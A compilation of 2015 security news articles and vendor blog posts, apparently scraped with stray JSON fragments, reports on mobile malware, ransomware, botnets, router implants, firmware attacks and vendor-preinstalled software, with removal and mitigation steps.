signed with enterprise certificates to install from a centralized command and control server. Three of the four malicious components can be used to hide their icons from iOS SpringBoard – the standard app that runs the home screen – and also disguise themselves with the same name and logos of system applications to escape detection from users. Vectors of YiSpecter malware According to researchers, YiSpecter malware has been targeting Apple's iOS devices for over 10 months, when it was first spread by disguising as an app that lets users watch free porn. The app was advertised as a private version of a famous media player \"QVOD\" – a popular video streaming app developed by Kuaibo(快播) to share porn videos. The malware then infected more devices through: Hijacked Internet traffic from ISPs A Windows worm that first attacked the Tencent’s instant messaging service QQ Online communities where people install third-party applications in exchange for promotion fees from app developers Security researchers from Palo Alto Networks have already reported the latest YiSpecter malware to Apple, which says \"they are investigating\" the issue. How to Remove YiSpecter from Your iOS Devices? For iOS users who are potentially infected by YiSpecter should follow the below four-step process to remove the malware from your devices: Head on to Settings –> General –> Profiles and remove all unknown or untrusted profiles. Delete any installed apps with names 情涩播放器, 快播私密版 or 快播0. You can use any third-party iOS management tool such as iFunBox on Windows or Mac OS X to connect with your iPhone or iPad Then check for installed iOS apps like Phone, Weather, Game Center, Passbook, Notes, or Cydia and delete them. (Note: this will not affect original system apps but just delete the fake malware apps) You can further visit Palo Alto Networks' blog post for more information on YiSpecter." }

The distributed denial-of-service network, dubbed XOR DDoS Botnet, targets over 20 websites per day, according to an advisory published by content delivery firm Akamai Technologies. Over 90 percent of the XOR DDoS targets are located in Asia, and the most frequent targets are the gaming sector and educational institutions. XOR creator is supposed to be from China, citing the fact that the IP addresses of all Command and Control (C&C) servers of XOR are located in Asia, where most of the infected Linux machines also reside. How XOR DDoS Botnet infects Linux System? Unlike other DDoS botnets, the XOR DDoS botnet infects Linux machines via embedded devices such as network routers and then brute forces a machine's SSH service to gain root access to targeted machines. Once the attackers have acquired Secure Shell credentials and logged in, they use root privileges to run a simple shell script that secretly downloads and installs the malicious XOR botnet software. However, there is no such evidence that XOR DDoS infects computers by exploiting flaws in the Linux operating system itself. A High-Bandwidth DDoS Attack Akamai's Security Intelligence Response Team (SIRT) has seen DDoS attacks – SYN and DNS floods as the observed attack vectors – with the bandwidth ranging from a few gigabits per second (Gbps) to nearly 179 Gbps. The upper figure is a massive DDoS attack volume that even most multinational corporate networks can not handle. However, the biggest recorded DDoS attacks have hit 400 Gbps. \"Over the past year, the XOR DDoS botnet has grown and is now capable of being used to launch [massive] DDoS attacks,\" Stuart Scholly, senior vice president of Akamai's Security Business Unit, said in a statement. Scholly further added that attackers are switching their focus from Windows botnets and building Linux botnets to launch massive DDoS attacks. However in the past, Windows machines were their primary targets for DDoS malware. How to Detect and Mitigate XOR DDoS Botnet? Akamai's advisory outlines two different methods for detecting the recent version of the XOR malware. To Detect XOR DDoS Botnet in your Network, look for the communications between a bot and its C&C server, using the Snort rule given in the advisory. To Detect XOR DDoS Botnet infection on your Hosts, use the YARA rule also shown in the advisory. Moreover, Akamai also provides a four-step process for removing the XOR DDoS Trojan from your machine, as given below: First, identify the malicious files in two directories (/boot and /etc/init.d) Identify the supporting processes responsible for the persistence of the main process Kill the malicious processes Delete the malicious files (in /boot and /etc/init.d) Additionally, disabling system root login from SSH (Secure Shell), or using a strong password will also defeat this issue." }

North America Runs Completely Out of IPv4 Internet Addresses The American Registry for Internet Numbers (ARIN) announced the final exhaustion of their free pool of IPv4 (Internet Protocol version 4) addresses. The free pool of IPv4 addresses has reached zero, i.e., the availability of IPv4 addresses no more exists. This is just the start of an era of IPv6, which was first invented in about two decades ago, and features much longer addresses (e.g. FE80:0000:0000:0000:0202:B3FF:FE1E:8329). This simply means that IPv6 (Internet Protocol version 6) could offer a total available pool of 340 Trillion Trillion Trillion addresses, providing capacity for a very long time. Read more…" }

One of the most popular computer manufacturers is being criticized for selling some refurbished laptop models pre-installed with invasive marketing software that sends users data directly to the company. This is not first time Lenovo has allegedly installed spyware onto consumers PCs. Earlier this year, Lenovo was caught red-handed for selling laptops pre-installed with Superfish malware that opened up doors for hackers. In August, Lenovo again got caught installing unwanted and non-removable crapware into part of the BIOS reserved for custom drivers. Lenovo Laptops comes Pre-installed with 'Spyware' Now, the Chinese computer manufacturer is making news once again for embedding tracking software into its laptops and workstations from Lenovo ThinkPad, ThinkCentre, and ThinkStation series. Michael Horowitz from Computerworld has discovered a software program, called \"Lenovo Customer Feedback Program 64,\" that operates daily on these systems and can be categorized as Spyware. The purpose of this program is to send customers' feedback data to Lenovo servers. According to Horowitz, the company has mentioned this in its EULA, but he \"can not recall ever being asked [for] a Customer Feedback program\" while ever setting up his Lenovo PC. Horowitz also found that this program includes some other files, which is as follows: Lenovo.TVT.CustomerFeedback.Agent.exe.config Lenovo.TVT.CustomerFeedback.InnovApps.dll Lenovo.TVT.CustomerFeedback.OmnitureSiteCatalyst.dll One of these files belongs to Omniture, which is an online marketing and Web analytics company, which is included to track and monitor users' activities and send that data to this online marketing agency.

This is what exactly done by a Taiwan-based networking equipment manufacturer D-Link, which accidently published its Private code signing keys inside the company's open source firmware packages. Dutch news site Tweakers made aware of the issue by one of its readers with online moniker \"bartvbl\" who had bought a D-Link DCS-5020L security camera and downloaded the firmware from D-Link, which open sources its firmware under the GPL license. However, while inspecting the source code of the firmware, the reader found what seemed to be four different private keys used for code signing. Hackers Could Sign Malware After testing, the user managed to successfully create a Windows application, which he was able to sign with one of the four code signing keys belonging to D-Link, which was still valid at the time. However, the other three private code signing keys he found did not appear to be valid. Besides those private keys into the source code, the reader also discovered pass-phrases needed to sign the software. It is still unclear whether these private keys have been used by malicious third-party vendors, but there are possibilities that the keys could have been used by hackers to sign their malware to execute attacks. The findings were confirmed by Yonathan Klijnsma from Dutch security firm Fox-IT. \"The code signing certificate is indeed a firmware package, firmware version 1.00b03, who's source was released February 27 this year,\" Klijnsma said. Meanwhile, D-Link has responded to this issue by revoking the certificate in question and releasing a new version of the firmware that does not contain have any code signing keys inside it.

WordPress, a Free and Open source content management system (CMS) and blogging tool, has been once again targeted by hackers at large scale. Researchers at Sucuri Labs have detected a “Malware Campaign” with an aim of getting access to as many devices they can by making innumerable WordPress websites as its prey. The Malware campaign was operational for more than 14 days ago, but it has experienced a massive increase in the spread of infection in last two days, resulted in affecting more than 5000 Wordpress websites. The Security researchers call this malware attack as “VisitorTracker”, as there exists a javascript function named visitorTracker_isMob() in the malicious code designed by cyber criminals. This new campaign seems to be utilizing the Nuclear Exploit Kit and uses a combination of hacked WordPress sites, hidden iframes and number of known and unknown Browser exploits. Though if we go by the name, it’s meaning can be extracted as tracking every visitor who accesses the victimized WordPress sites and further redirects them to the specially crafted page where the Nuclear Exploit Kit is planted. So, Plan of Action is: Insert a malware code to all the JavaScript files on the compromised WordPress website. On sensing a Visitor, Taking him to the exploit landing page via an iFrame. The landing page pushes browser based Exploits on the victim’s system to gain access. If Introspect, we'll notice that the exploit kit being used here can deploy attacks through vulnerabilities in plugins with an aim of data exfiltration. The Sucuri researchers team as a solution suggest, “The infection is very buggy and often removed single-quotes from legitimate files that corrupt the site completely. Affects plugins, themes and even core files of WordPress and Joomla. The solution is to restore files from a clean backup.” Moreover, to check if you are affected by the attack follow the below-mentioned command: (user with Admin rights can access) grep -r “visitorTracker_isMob” /var/www/ Additionally, as a prevention: Keep your plugins up-to-date, with latest security patches implemented. Always maintain a backup of your sensitive data." }

In their recent findings, a backdoor malware named SYNful Knock identified as the one compromising the principles of Cisco routers with features such as... ...Having an everlasting effect, i.e. Serious Persistence. What?- The malicious program is implanted in the router illicitly through the device’s firmware (regardless of the vendor). The goal is achieved by modifying the router's firmware image, which exists even after the device gets a reboot. How?- installing SYNful Knock in Cisco 1841 router, Cisco 2811 router, and Cisco 3825 router. Affected areas- 14 instances in 4 countries including India, Mexico, Ukraine, and the Philippines. Impact- the backdoor is backed up with such abilities that can compromise the availability of other hosts and access to sensitive data in an organization. “The theoretical nature of router-focused attacks created a mindset within our industry to focus on building more walls around the perimeter, leaving many organizations exposed when it comes to foundational devices like routers,” stated FireEye. With this statement, we can imagine how dangerous is this backdoor! As the implant is triggered by modifying the Cisco Inter-networked operating system (IOS), thus the implant activates in-capabilities in the Cisco victim like: It allows the attacker to install various functional modules from the anonymity of the internet. It provides unrestricted access using a wrapped backdoor password. It delivers modules via the HTTP protocol and not HTTPS. The controller (attacker) enables the TCP packets have a non-standard sequence and corresponding acknowledgment numbers. The modules are disguised as independent executable code or hooks within the router’s IOS with functionality similar to the backdoor password. The backdoor password provides access to the router through the console and Telnet. Also, The Hacker News (THN) reported about vulnerabilities in Belkin routers leading to privilege escalation and cyber attacks like man-in-the-middle attack. This is considered as an evident example where routers are being compromised on a large level. Besides this, a document stating possibilities of how Cisco’s IOS can be compromised and side-by-side protected against any malware can be seen here.

Korplug, a known variant of PlugX, is a Trojan that creates a backdoor used for information stealing on infected computers. In one of the most publicized cases, an evangelical church in Hong Kong was compromised to deliver the malware. Attackers were able to breach the church’s website and inject a malicious iFrame overlay designed to look like the site itself. The iFrame was then used to redirect visitors to a site hosting the IE exploit. Once users land on the website, they are served a java.html which installs Korplug on their computers. To defend against Korplug, system administrators, and security engineers should educate users of corporate assets about these types of hacking techniques. In many cases, organizations are breached because of the lack of internal education around how to identify threats. All too often breaches are successful when users execute malicious email attachments, download files from suspicious websites, or install cracked software. However, even with the right kind of education, users will still sometimes inadvertently compromise company assets. This usually occurs when a user accidentally exposes the network to a piece of malware posing as a legitimate spreadsheet, word doc in an email, or in the case of the evangelical church described above, an iFrame designed to look like a page in a website. Impact on You Acting like a backdoor, malware like Korplug can be used by an attacker to have complete control over a user’s computer. This allows the attacker to create privilege escalation, exfiltrate data on the user’s machine, or act as a pivot point to access more sensitive systems. How AlienVault Can Help AlienVault Unified Security Management (USM) provides asset discovery, threat detection (IDS), vulnerability assessment behavioral monitoring and SIEM in a single console, plus weekly threat intelligence updates developed by the AlienVault Labs threat research team.

The latest iOS 9 includes a security update for a nasty bug that could be exploited to take full control of your iPhone or Macs, forcing most of the Apple users to download the latest update. Australian security researcher Mark Dowd has disclosed a serious vulnerability in AirDrop, Apple's over-the-air file sharing service built into iOS and Mac OS X. How the Attack Works? The vulnerability allows anyone within the range of an AirDrop user to silently install a malicious app on a target Apple device by sending an AirDrop file which involves rebooting of the target device. An attacker can exploit this critical bug even if the victim rejects the incoming file sent over AirDrop. After rebooting takes place, the malicious app gains access to Springboard, Apple's software to manage iOS home screen, allowing the app to fool the victim’s iPhone into believing the malicious app has the same rights as a normal app. These rights include access to: Contacts Camera Location Messages and many more… …that could allow a more illustrious hacker to break into other sensitive areas of the Apple's operating system, causing severe damage to the victim's device. \"AirDrop bug can be used to target people wirelessly in close proximity. Also useful for lock-screen bypass,\" Dowd, founder and director of Azimuth Security, tweeted. Video Demonstration Dowd also provided a video demonstration (you can watch below) showing the real time attack on his iPhone running iOS 8.4.1. The vulnerability affects any iOS versions supporting AirDrop from iOS 7 onwards, as well as Mac OS X versions from Yosemite onwards. Update to iOS 9 and Mac OS X EI Capitan Apple has responded to the vulnerability by adding a sandbox to AirDrop in iOS 9 that would prevent anyone from writing files to arbitrary locations on the device via AirDrop service. However, it isn't clear when Apple will provide a complete patch to fix the issue. So the only way to prevent this attack, for now, is by upgrading your devices to iOS 9 and OS X 10.11 El Capitan, which won't roll out before September 16 and 30 respectively." }

A group of security researchers has uncovered what is believed to be the first real example of malware that is capable to reset the PIN code on a device and permanently lock the owner out of their own smartphone or tablet. This Android PIN-locking ransomware, identified as Android/Lockerpin.A, changes the infected device's lock screen PIN code and leaves victims with a locked mobile screen, demanding for a $500 (€450) ransom. Here's the Kicker: Since the lock screen PIN is reset randomly, so even paying the ransom amount won't give you back your device access, because even the attackers don't know the changed PIN code of your device, security researchers at Bratislava-based antivirus firm ESET warn. LockerPIN, as dubbed by the researchers, being spread through an adult entertainment apps installed from third-party websites, warez forums, and torrents – outside of the official Google Play Store. The app in question is Porn Droid, which is the second of its kind observed recently called Adult Player – another porn-themed Android app that takes selfies of its users and include them in its ransom messages. How LockerPIN Works? Once installed on the victim's smartphone, the app first tricks users into granting it device administrator rights. It does so by disguising itself as an \"Update patch installation\" window. After gaining admin privileges, the malicious app goes on to change the user's lock screen PIN code, using a randomly generated number. This random number is not even sent to the attacker, meaning even after victims pay the ransom; nobody can unlock the device's screen. Though the majority of infected devices are detected within the United States, the researchers have spotted the infections worldwide. How to Get Rid of this LockerPIN Ransomware? Unfortunately, there is \"no effective way\" to regain access to infected devices without losing personal data. Rebooting the device in Safe Mode and uninstalling the offending application or using Android Debug Bridge (ADB) alone won't solve the issue. The only way to unlock the device and get rid of LockerPIN ransomware app is to perform a factory reset that would wipe out all the personal data and apps stored on your device. Ransomware delivering through malicious apps are growing increasingly and becoming more sophisticated with time, and this newly discovered LockerPIN Ransomware proves the theory.

They just need to trick you to download an app, or may be a Porn app. Yes, if you are one of those who can't resist watching porn then you could be an easy target for hackers who are distributing ransomware via malicious pornography app to run you out of your money. A pornography application for Android called Adult Player that promises free pornographic videos has been caught taking photographs of users and then extorting them for ransom (Cyber Extortion). Once installed, Adult Player gains administrator access to the victim's device, which then allows it to load malicious ransomware files. When Hackers Turn to Blackmail: Demands $500 Ransom When a user opens the app, Adult Player secretly takes photos of the user with the help of front-facing camera and then demands a $500 (£330) ransom in order to restore the device access and delete all photos stored on attackers server. Before demanding ransom, the ransomware locks the victim's device to prevent access from regular use and displays a warning message until the payment is received through PayPal. According to the researchers from the security firm Zscaler, which uncovered the creepy nature of Adult Player, the app isn't available on the official Google Play Store and is distributed through adult websites. How to Get Rid of this Android Ransomware? Adult Player takes complete control of your device using the administrator privileges that you grant the app before installing, therefore restarting your device won't cause the ransom page requesting $500 to disappear. However, you can uninstall Adult Player by following these simple steps: Boot your device into \"Safe Mode,\" as it boots your device with default settings without running any third-party applications and allowing users to delete malicious software. To uninstall the ransomware from your device, you need to first remove administrator privilege by going to Settings –> Security –> Device Administrator and then select ransomware app and deactivate it. Once this is done, you can again go to Settings –> Apps –> Uninstall ransomware app. The bottom line: To avoid falling a victim to malicious apps like Adult Player, Android users are again reminded: Don't install apps from outside of the Google Play Store Don't grant administrator privileges to apps unless you truly trust them Read More: 'Tox' Offers Free build-your-own Ransomware Malware Toolkit Free Ransomware Decryption and Malware Removal ToolKit" }

Don't expect it to be a clean slate. A new report claims that some rogue retailers are selling brand-new Android smartphones loaded with pre-installed software. Security firm G Data has uncovered more than two dozens of Android smartphones from popular smartphone manufacturers — including Xiaomi, Huawei and Lenovo — that have pre-installed spyware in the firmware. G Data is a German security firm that disclosed last year the Star N9500 Smartphone's capability to spy on users, thereby comprising their personal data and conversations without any restrictions and users knowledge. Removal of Spyware Not Possible The pre-installed spyware, disguised in popular Android apps such as Facebook and Google Drive, can not be removed without unlocking the phone since it resides inside the phone's firmware. \"Over the past year, we have seen a significant [growth] in devices that are equipped with firmware-level [malware and spyware] out of the box which can take a wide range of unknown and unwanted actions,\" Product Manager Christian Geschkat from G Data said in a statement. Spyware Capabilities The spyware is capable of doing the following actions: Listening in to telephone conversations Accessing the Internet Viewing and copy contacts Installing unwanted apps Asking for location data Taking and copying images Recording conversations using the microphone Sending and reading SMS/MMS Disabling Anti-Virus software Listening in to chats via messaging services (Skype, Viber, WhatsApp, Facebook and Google+) Reading the browser history Third-Party Vendors or Intelligence Agency? Unlike the Star devices, the security firm suspects third party vendors or middlemen (retailers) and not the manufacturers to be behind modifying the device firmware to steal user data and inject advertisements to earn money. The possibilities may also include unintentional infection via compromised devices in the supply chain or intentional interference by government intelligence agencies. Affected Brands The affected Smartphone brands include Xiaomi, Huawei, Lenovo, Alps, ConCorde, DJC, Sesonn and Xido. Most of the suspected models are sold in Asia and Europe. However, this isn't the first time Chinese handsets come with pre-installed spyware. Back in March, the mobile security firm Bluebox found pre-loaded malware on Xiaomi Mi4 LTE. To which Xiaomi said the compromised handsets were high-quality counterfeits. Late last year, researchers from Palo Alto Networks discovered that the high-end devices from Coolpad came pre-installed with the backdoor, dubbed \"CoolReaper,\" sold exclusively in China and Taiwan." }

The same vulnerability has now been upgraded to again infect Mac OS X machines even after Apple fixed the issue last month. The privilege-escalation bug was once used to circumvent security protections and gain full control of Mac computers. Thanks to the environment variable DYLD_PRINT_TO_FILE Apple added to the code of OS X 10.10 Yosemite. The vulnerability then allowed attackers to install malware and adware onto a target Mac, running OS X 10.10 (Yosemite), without requiring victims to enter system passwords. However, the company fixed the critical issue in the Mac OS X 10.11 El Capitan Beta builds as well as the latest stable version of Mac OS X – Version 10.10.5. Mac Keychain Flaw Now, security researchers from anti-malware firm MalwareBytes spotted the updated version of the same highly questionable malicious installer is now accessing user's Mac OS X keychain without user's permission. Once executed, the updated installer throws an installer request that asks for permission to access the user's OS X keychain. The installer automatically simulates a click on the \"Allow\" button as soon as it appears, which allows it to gain access to the Safari Extensions List, said MalwareBytes researcher Thomas Reed. This allows the malicious installer to install a Genieo Safari extension. The entire process of installing a malicious extension and gain access to OS X keychain takes just a fraction of a second. You're Totally Screwed Up However, the more worrisome part is that the installer could easily be modified to grant attackers access to other data from the keychain alongside passwords for user's Gmail account, iCloud account, and other important accounts. Meanwhile, two security researchers from Beirut independently reported the Mac Keychain vulnerability on Tuesday, the same day Malwarebytes researchers disclosed their findings involving Genieo. The technique works on Mac systems only when invoked by an app already installed on user's systems. The issue is critical because the Mac keychain is supposedly the protected place for storing account passwords and cryptographic keys. Apple has yet to respond to this latest issue. Until then, Mac users are advised to follow the standard security practices, such as do not download files from unknown or untrusted sources, and be wary of emails or websites that seem suspicious." }

These attacks resulted in 21 million current and former Federal government employees’ information being stolen. After months of investigation, the FBI’s Cyber Task Force identified several Remote Access Tools (RATs) that were used to carry out the attack. One of the more effective tools discovered is named ‘FF-RAT’. FF-RAT evades endpoint detection through stealth tactics, including the ability to download DLLs remotely and execute them in memory only. Hackers use RATs to gain unlimited access to infected endpoints. Once the victim’s access privilege is acquired, it is then used for malware deployment, command and control (C&C) server communication, and data exfiltration. Most Advanced Persistent Threat (APT) attacks also take advantage of RAT functionality for bypassing strong authentication, reconnaissance, spreading infection, and accessing sensitive applications to exfiltrate data. In order to mitigate these types of attacks, it is key that you have tools and methods in place for early detection. It’s important these attacks are identified in time for you to isolate infected assets and remediate issues before they spread or move to a second stage (deploying additional malware, stealing important data, acting as its own C&C server, etc.) How this affects you When deploying a RAT, a hacker’s primary goal is to create a backdoor to infected systems so they can gain complete control over that system. When a RAT is installed on your system, the attacker is then able to view, change, or manipulate data on the infected machine. This leaves you open to your, and possibly your clients’, sensitive data being stolen. Often, a single RAT is deployed as a pivot point to deploy additional malware in the local network or use the infected system to host malware for remote retrieval. How AlienVault Helps AlienVault Labs, AlienVault’s team of security researchers, continue to perform cutting edge research on these types of threats. They collect large amounts of data and then create expert threat intelligence correlation directives, IDS signatures, vulnerability audits, asset discovery signatures, IP reputation data, data source plugins, and report templates. Activity from FF-RAT can be detected through IDS signatures and a correlation rule that the Labs team has released to the AlienVault Unified Security Management (USM) platform.

Caution! Recently, it has been reported that the growth of the Internet of Things would eventually lead to cyber criminals in making lots of money, as they started attacking the Internet of Things for Ransom. Yes, the latest Interest of the cyber criminals in the field of Internet of Things is ‘Ransomware’. Internet of Things (IoT) such as Android and iOS-based wearable Smartwatches and the concept of connected homes has now given a treat to the current generation Ransomware. With the advancements in Technology, cyber criminals are simultaneously promoting themselves from the threat known for restricting computers or encrypting files and asking users for money in return for gaining back access to their systems. From computers to mobile phones, now criminals are targeting the IoT and the wearables devices. Security researchers at Symantec demonstrated how an Android Wear device might be impacted by typical Android ransomware. In order to conduct this test, the researchers simply repackaged a current Android ransomware app (.apk file) – dubbed “Android.Simplocker”, inside a new Android Wear project. Next, they took a Moto 360 Smartwatch and paired it with an Android phone. When they installed the new .apk file on the phone, they found that the phone became infected with the ransomware. As the Smartwatch and an Android phone are required to be paired via Bluetooth for wireless connectivity, the ransomware also got pushed onto the smartwatch once the pairing of both the devices were done. Once installed on the smartwatch, the malware could be easily activated by the user if they were tricked into running it, by clicking on a malicious app. After installation, the ransomware will cause the smartwatch to become unresponsive and unusable! Simplocker Android ransomware then checks for the display of the ransom message every second, and if it is not shown, will push it onto the screen again. In addition, Simplocker encrypts a range of different files stored on the smartwatch’s SD card. Now, you must be thinking of escaping from the situation? You can recover from this situation, but unfortunately, it involves a factory reset of your smartwatch. But there also stands a condition where the rebooting of the device through hardware buttons is possible, then quickly navigating to the factory reset setting (within 20-30 seconds) before the ransomware is rebooted. According to Symantec, while this would erase all files on the smartwatch, those files would have been encrypted by the malware in the first place. For this one needs to keep an updated backup. No such ransomware has been seen yet, but the day is not far when this becomes a reality. As, in the past it was evident how smart Televisions got attacked with the ransomware also IoT devices being remotely controlled by the attacker. Therefore, the crux is that the users need to be more vigilant and even smarter than the technology they are dependent on." }

Earlier this year, Lenovo was caught red-handed for selling laptops pre-installed with Superfish malware. One of the most popular Chinese computer manufacturers ‘Lenovo’ has been caught once again using a hidden Windows feature to preinstall unwanted and unremovable rootkit software on certain Lenovo laptop and desktop systems it sells. The feature is known as \"Lenovo Service Engine\" (LSE) – a piece of code presents into the firmware on the computer's motherboard. If Windows is installed, the LSE automatically downloads and installs Lenovo's own software during boot time before the Microsoft operating system is launched, overwriting Windows operating system files. More worrisome part of the feature is that it injects software that updates drivers, firmware, and other pre-installed apps onto Windows machine – even if you wiped the system clean. So even if you uninstall or delete the Lenovo's own software programs, the LSE hidden in the firmware will automatically bring them back as soon as you power-on or reboot your machine. Users at a number of online forums are criticizing Lenovo for this move and suspecting that the Chinese computer maker has installed a \"bootkit\" that survives a full system wipe-and-reinstall. The issue was first discovered and reported by users back in May when using new Lenovo laptops but was widely reported Tuesday. What these Unwanted Program Does? For Desktops: In case of desktops, Lenovo's own description states that the software doesn't send any personally identifying information, but sends some basic information, including the system model, date, region, and system ID, to a Lenovo server. Moreover, the company claims that this process is done only one-time, sending the information to its server only when a machine first connects to the Internet. For Laptops: However, in case of Laptops, the software does rather more. LSE installs a software program called OneKey Optimizer (OKO) that bundles on many Lenovo laptops. According to the company, the OKO software is used for enhancing computer performance by \"updating the firmware, drivers, and pre-installed apps\" as well as \"scanning junk files and find factors that influence system performance.\" OneKey Optimizer falls under the category of \"crapware\". The worst part is that both LSE as well as OKO appears to be insecure. Back in April, security researcher Roel Schouwenberg reported some security issues, including buffer overflows and insecure network connections, to Lenovo and Microsoft. This forced Lenovo to stop including LSE on its new systems that built since June. The company has also provided firmware updates for vulnerable laptops and issued instructions to disable the option on affected machines and clean up the LSE files. Among others, many Flex and Yoga machines running an operating system including Windows 7, Windows 8, and Windows 8.1 are affected by this issue. You can see the full list of affected notebooks and desktops on Lenovo's website. Lenovo has since released an official statement, which notes that the systems made from June onwards have BIOS firmware that eliminates the issue, and it's no longer installing Lenovo Service Engine on PCs. Expert way! How to Remove Lenovo Service Engine (Rootkit) In order to remove LSE from your affected machines, you have to do it manually. Follow these simple steps in order to do so: Know your System Type (whether it’s a 32-bit or 64-bit version of Windows) Browse to the Lenovo Security Advisory, and select the link for your specific Lenovo machine. Click the \"Date\" button for the most recent update. Search for \"Lenovo LSE Windows Disabler Tool\" and Click the download icon next to the version that matches your version of Windows. Open the program once it downloads. It will remove the LSE software." }

Millions of Android devices could be hacked exploiting a plugin that comes pre-installed on your Android devices by the manufacturers. Most of the Android device manufacturers pre-install ‘Remote Support Tool (mRST)’ plugin onto their phones that are intended to help users, such as RSupport or TeamViewer. But, a critical Certifi-Gate security vulnerability in this mRTS plugin allows malicious applications to gain illegitimate privileged access rights, even if your device is not rooted. \"Certifi-Gate\" Android security vulnerability According to Israeli researchers at Check Point, Ohad Bobrov and Avi Bashan, Certifi-Gate Android vulnerability lies in the way Google’s partners (manufacturers) use certificates to sign remote support tools. Remote support tools often have root level access to Android devices, even if your device is not rooted. Thus any installed app can use Certifi-Gate vulnerability to gain unrestricted device access, including: screen scraping keylogging exfiltrating private information installing malware apps, and more The flaw affects thousands of millions of Android devices, and users cannot uninstall the vulnerable plugin from the device because it is part of the core system… ...Ironic, huh? “An attacker can exploit mRATs to exfiltrate sensitive information from devices such as location, contacts, photos, screen capture, and even recordings of nearby sounds.” Researchers explained in the published paper. “While analyzing and classifying mRATs, our research team found some apps share common traits with mRST. Known mRAT players include HackingTeam, mSpy, and SpyBubble.” Video Demonstration: Android Smartphones and tablets running the latest version of Android (Lollipop) are also at risk. Am I vulnerable to Certifi-Gate vulnerability? Checkpoint released an app that detects if your Android device is vulnerable to the Certifi-Gate exploits and also reveals if any attacks have already been launched on the user’s phone. The annoying news is that the vulnerability may not go away anytime soon, because Android phone manufacturer companies are notoriously slow in releasing patches to users." }

Security researchers have shown that Hackers could intercept Windows Update to deliver and inject malware in organizations. Security researchers from UK-based security firm ‘Context’ have discovered a way to exploit insecurely configured implementations of Windows Server Update Services (WSUS) for an enterprise. What is WSUS in Windows? Windows Server Update Services (WSUS) allows an administrator to deploy the Windows software update to servers and desktops throughout the organization. These updates come from the WSUS server and not Windows server. Once the updates are with the administrator on the server, he can limit the privilege for the clients in a corporate environment to download and install these updates. As the admin is the owner of the distribution of these updates. Intercepting WSUS to Inject Malware into Corporate Networks By default, WSUS does not use SSL encrypted HTTPS delivery for the SOAP (Simple Object Access Protocol) XML web service. Instead, it uses the non-encrypted HTTP. This is a major WSUS weakness that should not be ignored now. (At least when it has been exploited and shown to the world). As WSUS installations are not configured to use SSL security mechanism, hence they are vulnerable to man-in-the-middle (MitM) attacks. According to researchers Paul Stone and Alex Chapman, the attack is so simple that a hacker with low privileges can set up fake updates that can be installed automatically by connected machines. All update packages that are downloaded from the Microsoft Update website are signed with a Microsoft signature. Which cannot be altered. However, Hackers can alter Windows Update by installing malware in the metadata of the update. \"By repurposing existing Microsoft-signed binaries, we were able to demonstrate that an attacker can inject malicious updates to execute arbitrary commands,\" researchers said in the paper. A malicious attacker can inject malware in the SOAP XML communication between the WSUS server and the client and making it look purely authentic update to install. Windows update also includes more than 25,000 of 3rd-party drivers that are developed and signed by other developers, which can also be altered easily. “Our concern is that when plugging in a USB device, some of these drivers may have vulnerabilities that could be exploited for malicious purposes. Everyone is familiar with the 'searching for Drivers' and ‘Windows Update' dialog boxes on their desktops – but these seemingly innocuous windows may be hiding some serious threats.” So, now it can be a big security threat for the new Windows 10. Either the corporates are going to live in the era of old Windows or upgrade and welcome the malware! The researchers demonstrated the hack at the Black Hat security conference in Las Vegas this week in a talk titled, WSUSpect: Compromising the Windows Enterprise via Windows Update [PDF]." }

A team of security researchers has demonstrated exactly the same by developing a new hacking technique called Funtenna that uses sound and radio waves to siphon data from computers even without Internet access. According to a lead researcher Ang Cui of Red Balloon Security, the Funtenna radio signal hack has the potential to turn Internet-connected devices (printer, washing machine and air conditioner) – popularly known as the Internet of Things – into bugs that can transmit data out of a network using sound waves that can not be heard by a human ear. How Funtenna Works? The attacker only needs to install malware on a target's device such as a printer, office phone, or a computer. The malware overtakes the control of the electronic circuit of the device (general-purpose input/output circuits) and vibrates them at a frequency (which transmits radio signal) of the attacker's preference. An attacker then can pick up these signals using an AM radio antenna (Funtenna) from a short distance away. \"You have network detection, firewalls… but this transmits data in a way that none of those things are monitoring, this fundamentally challenges how certain we can be of our network security,\" said Cui. Here, the hacked devices are themselves acting as transmitters. Therefore, the new Funtenna technique bypasses all conventional network security methodologies. You can also watch a video demonstration of how Funtenna works below: Funtenna is actually using a technique known as \"Hardware Agnostic,\" which is generally available to operate with all modern computer systems and embedded devices. The team showcased its new technique in action at the Black Hat security summit in Las Vegas on Wednesday. It will also release a \"proof-of-concept\" code for researchers and hackers." }

This isn’t true, and security researchers have finally proved it. Two security researchers have developed a proof-of-concept computer worm for the first time that can spread automatically between MacBooks, without any need for them to be networked. Dubbed Thunderstrike 2, the new proof-of-concept firmware attack is inspired by previously developed proof-of-concept firmware called Thunderstrike. Thunderstrike Attack, developed by security engineer Trammell Hudson, actually took advantage of a vulnerability in Thunderbolt Option ROM that could be used to infect Apple Extensible Firmware Interface (EFI) by allocating a malicious code into the boot ROM of an Apple computer through infected Thunderbolt devices. Thunderstrike 2 Spreads Remotely Although the original Thunderstrike required an attacker to have physical access to your Mac computer to work, the new attack can be spread remotely. Thunderstrike 2 can be delivered via phishing emails, malicious Web site, as well as through a peripheral connected to the Ethernet port or USB. After downloaded on a computer, Thunderstrike 2 can infect Thunderbolt-connected accessories that use Option ROM. After that, the malware can automatically spread to any Mac that you plug the accessory into. Thunderstrike 2 is developed by two security researcher Trammell Hudson and Xeno Kovah of firmware security consultancy Legbacore. The researchers also demonstrated their attack, which you can watch in the video given below. Infects Mac Computers Without Detection Given the vicious worm, Thunderstrike 2, targets and lives in the firmware and can even evade a whole system reboot, it’s a real pain for the Mac users. \"Thunderstrike 2 is really hard to detect, it’s really hard to get rid of, and it’s really hard to protect against something that’s running inside the firmware,\" Kovah told Wired. \"For most users that’s really a throw-your-machine-away kind of situation. Most people and organizations don’t have the wherewithal to physically open up their machine and electrically reprogram the chip.\" Many of the firmware vulnerabilities discovered by the researchers to develop Thunderstrike 2 are common to most EFI firmware. A total of six vulnerabilities affected PCs from Dell, HP, Lenovo, Samsung, and others. Five firmware vulnerabilities also affected the Mac's firmware, and of those, Apple has fully patched one flaw, partially patched another, and failed to patch the rests. The researchers plan to present their findings at the Black Hat and Def Con security conferences in Las Vegas this week." }

